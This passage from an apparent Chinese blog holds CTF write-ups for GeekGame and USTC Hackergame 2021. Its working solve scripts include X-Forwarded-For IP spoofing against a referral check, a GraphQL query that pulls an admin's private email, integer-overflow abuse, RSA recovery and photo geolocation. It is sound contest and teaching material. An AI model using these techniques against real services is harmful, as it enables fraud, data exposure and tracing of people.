int(msg.split('\\n')[1])\nr.sendline(b'1')\nprint('Send 1\\n')\nmsg = r.recvrepeat(timeout=1).decode().strip()\nprint(msg)\nflag1_cip, cip = msg.split('\\n')\ncert = get_certificate(n, z)\nr.sendline(str(cert).encode())\nprint('Send ', cert, '\\n')\nmsg = r.recvuntil(b'Talk to Richard.\\n').decode().strip()\nflag2_cip = msg.split('\\n')[0]\nprint(flag2_cip)\nmsg = 'Sorry, I forget to verify your identity. Please give me your certificate.'\nprint(decode(flag1_cip, cip, msg).decode())\nprint(decode(flag2_cip, cip, msg).decode())\nr.close()\n```\n\ndecode_flag.py\n\n\n\n```python\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes\nimport binascii\n\n\ndef pad(msg):\n    n = 32 - len(msg) % 32\n    return msg + bytes([n]) * n\n\n\ndef group(msg):\n    results = []\n    for it in range(0, len(msg), 32):\n        pmsg = msg[it: it + 32]\n        a = bytes_to_long(pmsg[:8])\n        b = bytes_to_long(pmsg[8: 16])\n        c = bytes_to_long(pmsg[16: 24])\n        d = bytes_to_long(pmsg[24: 32])\n        results.append((a, b, c, d))\n    return results\n\n\ndef get_xor(cip1, cip2):\n    r1 = group(cip1)\n    r2 = group(cip2)\n    result = []\n    for (a1, b1, c1, d1), (a2, b2, c2, d2) in zip(r1, r2):\n        result.append((a1 ^ a2, b1 ^ b2, c1 ^ c2, d1 ^ d2))\n    return result\n\n\ndef get_message(msg1, xor_result):\n    r = group(msg1)\n    result = []\n    for (a, b, c, d), (ra, rb, rc, rd) in zip(r, xor_result):\n        result_c = c ^ ra\n        result_d = d ^ rb\n        result_a = rc ^ a ^ c ^ result_c\n        result_b = rd ^ b ^ d ^ result_d\n        result.append((result_a, result_b, result_c, result_d))\n    msg2 = b''\n    for a, b, c, d in result:\n        a = long_to_bytes(a, 8)\n        b = long_to_bytes(b, 8)\n        c = long_to_bytes(c, 8)\n        d = long_to_bytes(d, 8)\n        msg2 += a + b + c + d\n    return msg2\n\n\ndef decode(cip1, cip2, msg2):\n    \"\"\"To decode cip1\"\"\"\n    cip1 = binascii.unhexlify(cip1)\n    cip2 = binascii.unhexlify(cip2)\n    msg2 = pad(msg2.encode(\"utf-8\"))\n    msg1 = get_message(msg2, get_xor(cip1, cip2))\n    return msg1\n\n```\n\npass_identity.py\n\n\n\n```python\nimport gmpy2\n\n\ndef packmess(mess):\n    assert len(mess) <= 65535\n    return mess + (len(mess).to_bytes(2, 'big'))\n\n\naname = b'Alice'\npinfo = packmess(aname)\nrlen = 0\nsinfo = pinfo + b'\\x00' * rlen + int.to_bytes(rlen, 2, 'big')\n\nk = 2\n\n\ndef get_key(n):\n    y = (int.from_bytes(sinfo, 'big') * pow(k, 65537, n)) % n\n    length = int.from_bytes(y.to_bytes(256, 'big')[-2:], 'big')\n    y = y.to_bytes(length + 4, 'big')\n    x = y[2:-2]\n    return x\n\n\ndef get_certificate(n, z):\n    p = (z * gmpy2.invert(k, n)) % n\n    return int(p)\n\n```\n\n## ~~总结~~吐槽\n\n\n**第一：** GeekGame太硬核了，好像和主办方说的“让没有相关经验的新生和具有一定专业基础的学生都能享受比赛”不太相符，我虽不是信安出身，但也玩了三届Hackergame，三届的校内排名分别是24、15和4，按理也不算纯小白，但GeekGame的很多题给我的感受就是需要拼命猜出题人的意图，猜了半天最后发现方向错了的感觉很糟糕。个人感觉还是Hackergame的题面信息更有方向感，在解题过程中更容易定向地学到相关知识。换句话说，GeekGame的大部分题更适合经验丰富的CTF老手，而不适合纯萌新。\n\n\n不过，大部分题虽然难，但看题解还是能学到很多东西的，“叶子的新歌”是个例外，这题不仅疯狂套娃，writeup给的解题过程也是没什么逻辑关联性，感觉像是凭空想出来的，我都已经把马里奥游戏跑起来了，仍没有拿到一个flag，看了这题的题解后，我除了惊叹于“这信息居然都有用？”或者“这是人能想到的？也没个提示信息”之外，别无其他想法，而且名为新歌但解题过程与音频没有任何关系，换句话说把歌换成任何其他东西也能出此题，感觉应该是出题者为了让大家欣赏他写的歌特意放进去的，显得有点生硬，我曾一直以为音频里至少会藏有一个flag，研究了很久却毫无结果。另外如rank 1大佬所说的，题目里出现了几个外部链接，这是一种不太合理的设计。（不过这题的主线故事倒是写的挺感人的）\n\n\n**第二：** 主办方在第二阶段给的一些提示感觉不是很合理，有的提示相当于直接把题解按在了脸上，例如“翻车的谜语人”：\n\n\n第二阶段提示  \n\nFlag 1. You 酱在一边挂着 B 站直播间一边使用 Jupyter Notebook 出题，你只需关心后者  \n\nFlag 2. You 酱前几天在服务器上运行了命令 date，并把输出分享给了你：Sat 06 Nov 2021 11:45:14 PM CST\n\n\n\n感觉把第二条提示改成“You酱平时喜欢用Kali Linux系统”更合适一些，认真做过此题的选手应该都能感受到，这提示基本就差直接把flag打在屏幕上了。从给了提示以后解出此题的人数翻了一倍多也可以看出提示的不合理性。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/5da1675a962ade5ecebb52d79f9bee8f.png)\n\n而有的提示感觉就是说了跟没说一样，例如“诡异的网关”：\n\n\n第二阶段提示  \n\n账号密码保存在哪里？\n\n\n\n建议体会一下早在题目刚放出的时候就找到了帐号密码的保存位置但研究了几天没有结果最后拿到这样一条提示的我的心情。\n\n\n这一题我最初的思路是使用pywin32接口写脚本获取文本框内容，在失败以后经过尝试找到了保存账号密码的文件，然后就一直苦于破解文件的加密（试了一堆古典密码都没成功），拿到这条提示更是让我在第二种思路的错误道路上越走越远。（虽然提示的本意可能是让我们去内存中看，不过感觉还是有一定的误导性）\n\n\n这题给了提示之后解出人数只增加了8个，相比于一阶段的近50人解出，基本可以认为提示确实一点用都没有（一阶段时解出这题的人数就基本在以每天十个的速度上涨，然而给了提示之后，上涨速度反而还变慢了XD）\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/89f8367b5fe538c1df63a1913f35fa8f.png)\n\n赛后看了别人的题解，发现这道题用WinSpy可以秒出答案（我一开始试过用pywin32写脚本获取文本框内容，然后失败了，所以思路是对的只是工具没找对咯hhh，另外这和Binary有什么关系？？）\n\n\n另外还有疯狂套娃题“叶子的新歌”：\n\n\n第二阶段提示  \n\n1. 使用某些软件可以查看 MP3 的 metadata  \n\n2. 【FAQ：常用工具】里的虚拟化软件在这道题里真的有用  \n\n3. 解题过程中得到的文本中可能包含提示\n\n\n\n这种提示同样对卡在后几层的选手没有任何帮助。\n\n\n鉴于提示没有办法照顾到所有选手，提示的质量也不易控制，我认为不如直接去掉第二阶段，再把题目出的更明确一些，减少选手们的瞎摸索时间，或许更加合理。\n\n\n**第三：** 感觉作为一场普通的校内线上个人赛，组委会给的奖金确实有点多（至少对于大部分学生党来说，两三千块钱算是一笔不小的收入了），高额的奖金固然有利于激发选手的动力，但线上赛的本质就已经决定了没有办法从根源上杜绝作弊现象，组委会的反作弊手段再高明都不如降低奖金来的靠谱。作为对比，Hackergame中没有设置高额的奖金，只设有鼓励性质的奖品，在这种情况下选手们相对而言会更愿意为了解出flag的成就感、学到更多信息安全的知识而去解题，屯flag的卷王基本很少见（当然这符合规则，只是我认为“卷”未必是一种好的氛围），为了拿低金额的奖品而选择作弊更是没什么意思。（外校人员，奖金什么的与我无关，纯理性吐槽）\n\n\n不过话说回来，体验不好的原罪还是因为自己菜，我等菜狗还需努力！\n","tags":["GeekGame","GeekGame 1st"],"categories":["CTF题解"]},{"title":"USTC Hackergame 2021部分题目Write-Up","url":"//blog/6797/","content":"\nUSTC Hackergame 2021结束了，这里从一个非科班选手的角度写一下部分题的解题思路与过程。\n\n![](https://oss.fyz666.xyz/blogfiles/png/6fa889df6c7b73bdeaa45da34c9b0976.png)\n\n\n{% link 本次比赛的官方存档,GitHub,https://github.com/USTC-Hackergame/hackergame2021-writeups %}\n\n\n---\n\n## 签到\n\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！\n\n\n{% endnote %}\n{% endhideToggle %}\n\n![](https://oss.fyz666.xyz/blogfiles/png/a11b54aeb91b440d2f3cbf7889cdb767.png)\n签到题还是一样简单，打开页面显示一个时间为：1970-01-01 08:00:00 +08:00点一下Next，时间多了一秒，同时注意到url多了一个参数：/?page=1。结合题意知道只要访问/?page=当前的时间戳，即可拿到flag。调用Python的time库的time函数即可获取当前的时间戳，取整放到url参数中即可。\n\n\nflag{HappyHacking2021-29decda8a3}\n\n\n\n当然只要你点鼠标的速度足够快，也可以通过连点Next约16亿下来获取flag。[来自官方的统计信息](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md#%E4%B8%80%E4%BA%9B%E7%BB%9F%E8%AE%A1%E4%BF%A1%E6%81%AF)\n\n\n\n\n---\n\n## 去吧！追寻自由的电波\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n（前情提要） 为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。\n\n\n当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。\n\n\n考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。\n\n\n为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？\n\n\n注：flag 花括号内只包含小写字母。\n\n\n原始音频：\n\n\n<audio controls=\"\" src=\"https://oss.fyz666.xyz/blogfiles/mp3/fe4de991e844d56306075dd9c50c37a2.mp3\"></audio>\n\n{% endnote %}\n{% endhideToggle %}\n\n下载到一个mp3文件，打开一听，感觉语速很快，音调很高，难以分辨说的是啥。\n\n\n一开始考虑了mp3隐写等可能，均失败，后来才注意到题目是有内容的，通过题目第三段可知，这段语音的速度确实是经过加快的，而且采用了我之前没听过的“无线电中惯用的方法”，查到[维基页面](https://zh.wikipedia.org/wiki/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D)\n\n\n那么接下来只要把音频速度和音调放低了听即可。\n\n\n用到的工具：ffmpeg\n\n\n\n```bash\nffmpeg -i flag.mp3 -filter_complex \"asetrate=48000*2^(-12/12),atempo=0.5\" output.mp3\n```\n\n通过此命令转成output.mp3，然后可轻松听出每一个单词（比高中听力简单多了），通过前面维基百科查到的对应表做一个转换，即可拿到flag。转换后的音频如下：\n\n\n<audio controls=\"\" src=\"https://oss.fyz666.xyz/blogfiles/mp3/96e8d715c9d9145bdc25a0b8191847a2.mp3\"></audio>\n\n\nflag{phoneticab}\n\n\n\n\n\n---\n\n## 猫咪问答 Pro Max\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n我猛然一看，就猛然看到这个猫咪问答，我直呼我直呼，上次看到这么这么的发言还是上次，这问答属于是典型的典型了，我之前还没发现，当我发现的时候我已经发现了，这问答就像一个问答，问答的内容充满了内容，我不禁感慨了一句感慨：希望下次看到这么这么的猫咪问答是下次。\n\n\n\n考察搜索能力的经典老题了，看了题目文案，感觉真是听君一席话，如听一席话。\n\n\n题目如下：\n\n\n1. 2017 年，中科大信息安全俱乐部（SEC@USTC）并入中科大 Linux 用户协会（USTCLUG）。目前，信息安全俱乐部的域名（sec.ustc.edu.cn）已经无法访问，但你能找到信息安全俱乐部的社团章程在哪一天的会员代表大会上通过的吗？  \n**提示：输入格式为 YYYYMMDD，如 20211023。请不要回答 “能” 或者 “不能”。**\n2. 中国科学技术大学 Linux 用户协会在近五年多少次被评为校五星级社团？  \n**提示：是一个非负整数。**\n3. 中国科学技术大学 Linux 用户协会位于西区图书馆的活动室门口的牌子上“LUG @ USTC”下方的小字是？  \n**提示：正确答案的长度为 27，注意大小写。**\n4. 在 SIGBOVIK 2021 的一篇关于二进制 Newcomb-Benford 定律的论文中，作者一共展示了多少个数据集对其理论结果进行验证？  \n**提示：是一个非负整数。**\n5. 不严格遵循协议规范的操作着实令人生厌，好在 IETF 于 2021 年成立了 Protocol Police 以监督并惩戒所有违背 RFC 文档的行为个体。假如你发现了某位同学可能违反了协议规范，根据 Protocol Police 相关文档中规定的举报方法，你应该将你的举报信发往何处？  \n**提示：正确答案的长度为 9。**\n\n{% endnote %}\n{% endhideToggle %}\n拿到题目就开始一顿搜，第一题刚开始没搜出来，采用了爆破（估计时间也不会太早，我从2010年开始爆破，一会就找到了。实在不行从建校那天开始呗\\doge，虽然那会还没互联网），其他几题都容易搜到。\n\n\n第4题谷歌关键词：SIGBOVIK 2021 Newcomb-Benford。打开第一个查询结果（是个PDF），翻到213页，注意到下面这段话：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/2104c43d5c212736f8357389618b5936.png)\n得到答案为13。\n\n\n第5题谷歌关键词：Protocol Police。点开第一个查询结果（RFC 8962: Establishing the Protocol Police），因为提到了举报，在页面右侧菜单栏中找到[Reporting Offenses](https://www.rfc-editor.org/rfc/rfc8962.html#name-reporting-offenses)，点击跳转到目标，获取答案。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/9ef191d5b6b1a8c53f2b64a19097d5f7.png)\n第2、3题直接去[LUG社团的网站](https://lug.ustc.edu.cn/)搜会更容易搜到结果，不再细说。\n\n\n后来了解到第一题可以在[Wayback Machine](http://web.archive.org/web/20170515053637/http://sec.ustc.edu.cn/doku.php/codes)查到（又学到了一个新东西）。\n\n\n\n---\n\n## 卖瓜\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n有一个人前来买瓜。\n\n\nHQ：哥们，这瓜多少钱一斤啊？\n\n\n你：两块钱一斤。\n\n\nHQ：What's up！这瓜皮子是金子做的还是瓜粒子是金子做的？\n\n\n你：你瞧瞧现在哪有瓜啊？这都是大棚的瓜，只有 6 斤一个和 9 斤一个的，你嫌贵我还嫌贵呢。\n\n\n（HQ 心里默默一算）\n\n\nHQ：给我来 20 斤的瓜。\n\n\n你：行！\n\n\nHQ：行？这瓜能称出 20 斤吗？\n\n\n你：我开水果摊的，还不会称重？\n\n\nHQ：我问你这瓜能称出 20 斤吗？\n\n\n你：你是故意找茬，是不是？你要不要吧！\n\n\nHQ：你这瓜要是刚好 20 斤吗我肯定要啊。那它要是没有怎么办啊？\n\n\n你：要是不是 20 斤，我自己吃了它，满意了吧？\n\n\n（你开始选瓜称重）\n\n\n补充说明：当称的数字变为浮点数而不是整数时，HQ 不会认可最终的称重结果。\n\n{% endnote %}\n{% endhideToggle %}\n\n题目改编自经典的华强买瓜片段，简单说就是要用6斤1个的瓜和9斤1个的瓜，凑出20斤来。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/9c07677e053bb7b60b99b058cccf71a3.png)\n掐指一算，发现20不是3的倍数，因此直接称肯定不行。\n\n\n然后试了试能不能称浮点数个瓜，结果发现在后端被取整了，也不行。\n\n\n然后考虑溢出，在9斤那里放上 $100000000000000000000000000000000$个（并不需要那么多0，只是我懒得算了），变成了“电子秤上已有 $-9223372036854775808/20$ 斤的瓜。”\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/b59d79debaae86a1b8fe4d06a02a6461.png)\n说明这题可以溢出，然后看一下溢出的数$9223372036854775808（2^{63}）$模3的余数，发现是余2的，而20也是模3余2，因此只需要再溢出一次，即可成功搞到模3余0的情况。但在第二次溢出之前，需要先把瓜加回0附近，先放 $9223372036854775808 // 9 = 1024819115206086200$ 个9斤的：\n\n![](https://oss.fyz666.xyz/blogfiles/png/d265f8f73640df43b82287fc503d6384.png)\n再放1个9斤的：\n\n![](https://oss.fyz666.xyz/blogfiles/png/63a54d974086ee4d05cde66b7af9bc04.png)\n再和前面一模一样重新操作一次，可以拿到2斤的瓜，最后3个6斤收尾。\n\n![](https://oss.fyz666.xyz/blogfiles/png/04050713180d205dd06cdb90d15594eb.png)\n\n\n---\n\n## 透明的文件\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n一个透明的文件，用于在终端中展示一个五颜六色的 flag。\n\n\n可能是在 cmd.exe 等劣质终端中被长期使用的原因，这个文件失去了一些重要成分，变成了一堆乱码，也不会再显示出 flag 了。\n\n\n注意：flag 内部的字符全部为小写字母。\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2021-writeups/raw/master/official/%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6/src/transparent.txt)\n{% endnote %}\n{% endhideToggle %}\n题目提示“终端”以及“失去重要成分”，拿到文件一看发现内容如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/8eb324cd21dfda5448e5c39be037e602.png)\n这种编码好像曾在哪里见过（美化PS1环境变量的时候抄过别人写的），经过一番查找，发现是[ANSI escape codes](https://notes.burke.libbey.me/ansi-escape-codes/)。\n\n\n读懂语法以后，得知该代码每一条均以“\\e[”开头，而这里以“[”开头，肯定是缺了“\\e”，因此直接把所有“[”替换成“\\e[”。刚开始这么试了一下，依稀看到flag字样，仔细看倒也能看出来，不过非常模糊，不容易识别，后来发现如果把文件中的空格替换成可以显示的字符，就可以清楚地看到flag。转换脚本：\n\n```python\nwith open('transparent.txt') as f:\n    data = f.read().strip()\nd = data.replace('[', '\\e[').replace(' ', 'a')\nwith open('1.sh', 'w') as f:\n    f.write(\"clear;echo -e \\\"\" + d + \"\\\"\")\n```\n\n运行得到1.sh以后，直接在终端执行命令：\n\n```bash\nsh 1.sh\n```\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/ce8de41c7489f14f887a65151500dbab.png)\n\n\n---\n\n## 旅行照片\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n你的学长决定来一场说走就走的旅行。通过他发给你的照片来看，他应该是在酒店住下了。\n\n![](https://github.com/USTC-Hackergame/hackergame2021-writeups/raw/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87/src/travel-photo.jpg)\n从照片来看，酒店似乎在小区的一栋高楼里，附近还有一家 KFC 分店。突然，你意识到照片里透露出来的信息比表面上看起来的要多。\n\n\n请观察照片并答对全部 5 道题以获取 flag。注意：图片未在其他地方公开发布过，也未采取任何隐写措施（通过手机拍摄屏幕亦可答题）。\n\n\n{% endnote %}\n{% endhideToggle %}\n题目给了一张照片，并说明了不存在隐写等操作，因此应该是通过照片细节去寻找相关信息。\n\n\n需要回答的问题如下：\n\n\n1. 该照片拍摄者的面朝方向为？\n2. 该照片的拍摄时间大致为？\n3. 该照片的拍摄者所在楼层为？\n4. 该照片左上角 KFC 分店的电话号码是？\n5. 该照片左上角 KFC 分店左侧建筑有三个水平排列的汉字，它们是？\n\n前三题通过比较常规的地理知识或经验即可做出（也可直接爆破），主要难点在后两题。\n\n\n很多同学给出的做法是直接在谷歌搜“蓝色 KFC”等关键词，可直接搜到类似的信息，通过比对可知其位于秦皇岛某海滩。而我就比较灵性了，我搜了半天“绿色 KFC”，并没有搜到什么有用的信息。。。这居然不是绿色，大概是海水的颜色误导了我。\n\n\n最后我的解法是，把图片中KFC右上角那栋彩色的建筑送进百度识图，也能发现其位于秦皇岛（因为这建筑造型太独特了），然后，打开百度地图的卫星视图，在秦皇岛海岸线附近找沙滩以及图中比较明显的停车场，最后找到这样一处地方：\n\n![](https://oss.fyz666.xyz/blogfiles/png/bb248ab252e33efb8a335af2097df111.png)\n停车场和沙滩的位置、形状与图片中的一模一样，推测就是这里，然后通过百度街景查看细节：\n\n![](https://oss.fyz666.xyz/blogfiles/webp/7ce643daed238555a9d7f3efc6c4ac8d.webp)\n这个停车场旁边的建筑好像就是题目里说的KFC分店左侧的建筑，只不过拍街景的时候KFC还没建起来。。。因此第5题答案即为“海豚馆”。\n\n\n在获取了详细的地点信息后，第4题只需打开美团，定位秦皇岛，搜“KFC 新澳海底世界”即可查到这家蓝色KFC的电话。\n\n\n此题第二种解法：如果你恰好去过秦皇岛新澳海底世界，对照片内的风景有印象的话，这题约等于送分。否则，可以去中国的沿海城市玩一圈，对每一片海滩周围的景物仔细观察，也可以轻松找到答案。\n\n\n这道题告诉我们，照片不要乱发，否则容易被人肉到很多信息。\n\n\n---\n\n## FLAG助力大红包\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n“听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！”\n\n\n“还有这么好的事情？我也要参加！”\n\n\n“快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。”\n\n\n“那怎么才能参加呢？”\n\n\n“这还不简单！点击下面的链接就行”\n{% endnote %}\n{% endhideToggle %}\n\n这题目文案看上去就像某多多的老套路。\n\n\n题目界面如下，需要在10分钟以内收集到若干个好友助力，方可获得flag，虽然一开始就送了你半个flag，但和某多多一样，不是那么容易集齐的。\n\n![](https://oss.fyz666.xyz/blogfiles/png/e374095e567da7624672f245f60c9691.png)\n点击给出的分享链接，发现只有一个按钮，点一下则显示：\n\n![](https://oss.fyz666.xyz/blogfiles/png/dab12cc658a6178ec65685be1e5e2d73.png)\n打开f12，发现该按钮的请求表单为：\n\n![](https://oss.fyz666.xyz/blogfiles/png/4fc7f88b55f8399ff0ab3cb1f8ce2acb.png)\nname为ip的input被藏了起来，直接通过Python构造请求，随便赋值一个ip地址，提交请求发现他还会检验后端ip地址是否和前端传过去的匹配，如不相同会报“疑似伪造地址”。\n\n\n第一反应是真的要去找那么多个ip代理去访问这个链接，但明显不现实，遂考虑用x-forwarded-for请求头去伪造ip，试了一个发现居然真的可以，于是再试一个，返回“重复的/8地址”，幸亏学了点计网，知道/8是ip地址的掩码，因此推测最多只需构造256个前8位（第一个数字）不同的ip地址，依次访问即可获取flag，以下为脚本：\n\n```python\nimport requests\nimport time\n\nip = \".168.0.1\"\ndata = {\n    \"ip\": \"\"\n}\nheaders = {\n    \"X-Forwarded-For\": \"\",\n}\nurl = \"http://202.38.93.111:10888/invite/1b9e9ff5-2d92-4dad-94ed-05887c9a9273\"\nfor i in range(256):\n    data['ip'] = str(i) + ip\n    headers['X-Forwarded-For'] = str(i) + ip\n    r = requests.post(url, data=data, headers=headers)\n    if '助力成功' in r.text:\n        print(i, ' Success')\n    time.sleep(1.5)\n\n```\n\n---\n\n## 图之上的信息\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。\n\n\n你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？\n\n{% endnote %}\n{% endhideToggle %}\n又是一个没听说过的东西，先打开题目网站，通过guest帐号登录：\n\n![](https://oss.fyz666.xyz/blogfiles/png/01d63a7ab300d935fe33c6b08ba03c71.png)\n打开f12刷新页面，发现一条名为graphql的请求：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/d470375e2b855c4620a8444e07c0445c.png)\n通过简单的学习和分析可知这种请求的格式大概长这样：\n\n```plaintext\n{\n    Query(\n        field1: value1\n        field2: value2\n        ...\n        ){\n        field3\n        field4\n        ...\n    }\n}\n```\n\n感觉就是用field1、field2等字段来筛选查找，获取field3、field4等字段。\n\n\n那如何知道有哪些查询方式以及字段呢，简单了解以后，发现可以通过对接口发起一个这样的查询：\n\n```plaintext\n{\n    __schema {\n        types {\n          name\n        }\n    }\n}\n```\n\n分析一下拿到的数据即可。不过我当时懒得去分析这些数据，而是下了一个[软件](https://github.com/skevy/graphiql-app/releases/)\n\n![](https://oss.fyz666.xyz/blogfiles/png/5c41b01c837e2efffa11341c3aa445e3.png)\n在右侧，该软件直接为我们解析了这个接口所有的查询接口以及字段名，依次点击user、GUser：\n\n![](https://oss.fyz666.xyz/blogfiles/png/d5c9d4b105feba9d49cb6617d0dce3ce.png)\n发现有个privateEmail字段。因为guest的id为2，猜测admin的id是1。因此，只需构造如下的查询：\n\n![](https://oss.fyz666.xyz/blogfiles/png/809f36a4be6376ae3a55bae9f582beef.png)\n即可拿到flag。\n\n\n---\n\n## Easy RSA\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n自从 [Hackergame 2018 公然揭露了大整数可以被神童口算分解的事实](https://github.com/ustclug/hackergame2018-writeups/tree/master/official/RSA_of_Z#%E8%A7%A3%E6%B3%95-1)，RSA 在 hackergame 中已经只能处于低分值的地位了。如果不在其名称前面加上 Easy 这个单词，似乎就会显得完全对不起其他题目。\n\n\n更何况，在本题的附件中，你还获得了构造 p 和 q 的方式。数理基础扎实的你应该可以轻松解决这些问题吧。\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2021-writeups/raw/master/official/Easy%20RSA/src/Easy_RSA.py)\n\n{% endnote %}\n{% endhideToggle %}\n如题所说，这是一道比较简单的RSA，先看flag相关的代码：\n\n```python\np = get_p()\nq = get_q()\n\nm = int.from_bytes(open(\"flag.txt\", \"rb\").read(), \"big\")\nc = pow(m, e, p * q)\nprint(\"c = \", c)\n# c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\n```\n\n发现这就是一个普通的RSA，而且居然直接给了p、q的生成函数。\n\n\n先看`get_p`：\n\n```python\ndef get_p():\n    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\n    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n    value_p = sympy.nextprime((math.factorial(y)) % x)  # Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征\n    return value_p\n```\n\n要得到p就要计算y! % x，但这里x、y都贼大，因此不能直接通过`math.factorial`来计算y的阶乘。我本科是数学专业出身，数理基础扎实/doge，由阶乘求模联想到曾经学过的Wilson定理：\n\n\n$$(p-1)! \\equiv -1\\ (mod\\ p)$$\n\n\n在p为素数时成立。\n\n\n那么只要验证一下x是不是素数：\n\n![](https://oss.fyz666.xyz/blogfiles/png/bddb62f36e0d29fa08e8f8c60adecf1b.png)\n果然是素数，那么就可以通过Wilson定理逆推了，代码如下：\n\n```python\nimport gmpy2\nimport sympy\nx = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\ny = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n# (x-1)!mod x=x-1\n# (x-k-1)!mod x=(((x-k)!mod x) * invert(-k)) mod x\n\ndef get_p(x, y):\n    \"\"\"p = next_p(y! % x) where x is prime\"\"\"\n    r = x - 1\n    n = x - 1 - y\n    for i in range(1, n + 1):\n        r = (r * gmpy2.invert(- i, x)) % x\n\n    return sympy.nextprime(int(r))\n\np = get_p(x, y)\n```\n\n对于下面的q，只要看懂了生成过程，其实比p更容易求出来：\n\n```python\ndef get_q():\n    value = [getPrime(256)]\n    for i in range(1, 10):\n        value.append(sympy.nextprime(value[i - 1]))\n    print(\"value[-1] = \", value[-1])\n    # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967\n    n = 1\n    for i in range(10):\n        n = n * value[i]\n    q = getPrime(512)\n    value_q = pow(q, e, n)\n    print(\"value_q = \", value_q)\n    # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\n    return sympy.nextprime(q)\n```\n\n通过阅读代码，得知获取q只需解一个推广的RSA（模数有多个因子的情形），而且因子全部已知。计算q的代码：\n\n```python\nimport sympy\nimport gmpy2\n\nvalue = [80096058210213458444437404275177554701604739094679033012396452382975889905967]\nfor _ in range(1, 10):\n    value.insert(0, sympy.prevprime(value[0]))\ne = 65537\nn = 1\nr = 1\nfor i in range(10):\n    n = n * value[i]\n    r = r * (value[i] - 1)\nvalue_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\nd = int(gmpy2.invert(e, r))\nq = sympy.nextprime(pow(value_q, d, n))\n```\n\n拿到p、q以后，我们又拥有密文c，很容易获取到明文。代码如下：\n\n```python\nc = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\nd = int(gmpy2.invert(e, (p - 1) * (q - 1)))\nm = pow(c, d, p * q)\nflag = int.to_bytes(m, 28, 'big')\nprint(flag)\n```\n\nflag{CRYPT0_1s_Interesting!}\n\n本题全部解题代码：\n\n```python\nimport gmpy2\nimport sympy\nx = 